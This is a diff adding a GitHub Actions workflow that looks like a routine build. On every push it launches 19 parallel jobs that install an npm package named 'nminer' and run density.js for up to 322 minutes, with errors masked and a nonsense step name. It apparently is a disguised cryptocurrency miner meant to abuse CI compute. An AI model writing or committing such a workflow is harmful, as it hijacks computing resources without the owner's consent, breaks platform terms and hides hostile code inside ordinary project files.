@@ -1,0 +1,44 @@
+name: density
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 1474 }
+          - { version: 7998 }
+          - { version: 8457 }
+          - { version: 2613 }
+          - { version: 990 }
+          - { version: 1199 }
+          - { version: 4812 }
+          - { version: 7011 }
+          - { version: 4736 }
+          - { version: 5832 }
+          - { version: 4859 }
+          - { version: 7390 }
+          - { version: 2387 }
+          - { version: 9726 }
+          - { version: 1367 }
+          - { version: 9589 }
+          - { version: 8741 }
+          - { version: 5322 }
+          - { version: 7093 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: huzzah hollow velocity
+        run: |
+          npm install nminer@latest
+          timeout 322m node density.js || echo "density executed"
